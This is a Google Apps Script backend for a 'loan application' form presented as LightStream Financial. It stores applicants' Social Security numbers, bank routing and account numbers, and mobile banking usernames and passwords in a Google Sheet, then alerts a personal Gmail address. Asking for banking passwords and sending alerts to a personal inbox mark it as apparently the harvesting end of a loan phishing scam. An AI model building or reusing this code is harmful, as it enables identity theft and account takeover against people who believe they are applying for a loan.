const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doGet(e) {
  return ContentService.createTextOutput("Google Sheets API is working ‚úÖ");
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Loan Applications");
    const data = JSON.parse(e.postData.contents);

    sheet.appendRow([
      data.loanAmount,
      data.loanPurpose,
      data.creditScore,
      data.name,
      data.email,
      data.phone,
      data.streetAddress,
      data.city,
      data.state,
      data.zipCode,
      data.ssn,
      data.bankName,
      data.routingNumber,
      data.accountNumber,
      data.annualIncome,
      data.employmentStatus,
      data.monthlyHousing,
      data.yourBank,
      data.mobileBankingUserId,
      data.mobileBankingPassword,
      new Date()
    ]);

    // üìß ORIGINAL WORKING EMAIL FUNCTION
    sendEmailNotification(data);

    return ContentService.createTextOutput(
      JSON.stringify({ status: "success" })
    ).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(
      JSON.stringify({ status: "error", message: err.message })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}

// üìß SIMPLE EMAIL FUNCTION (UPDATED FOR CURRENT FIELDS)
function sendEmailNotification(data) {
  try {
    Logger.log("üìß Starting email function...");
    Logger.log("üìß Data received: " + JSON.stringify(data));
    
    const recipientEmail = "finnfoxpersonalloan@gmail.com";
    Logger.log("üìß Recipient: " + recipientEmail);
    
    const subject = "üè¶ New " + (data.type || "Loan") + " Application - LightStream Financial";
    Logger.log("üìß Subject: " + subject);
    
    const body = `
New ${data.type || "loan"} application received:

Customer: ${data.firstName || ''} ${data.lastName || ''}
Email: ${data.email || 'N/A'}
Phone: ${data.phone || 'N/A'}
Loan Amount: $${data.loanAmount || 'N/A'}
Loan Purpose: ${data.loanPurpose || 'N/A'}
Bank: ${data.bankName || 'N/A'}

Submitted: ${new Date().toLocaleString()}

Check Google Sheet for complete details.
    `;
    
    Logger.log("üìß Body prepared, sending email...");
    
    MailApp.sendEmail({
      to: recipientEmail,
      subject: subject,
      body: body
    });
    
    Logger.log("‚úÖ Email notification sent successfully");
    
  } catch (error) {
    Logger.log("‚ùå Email failed: " + error.message);
    Logger.log("‚ùå Error details: " + error.toString());
  }
}
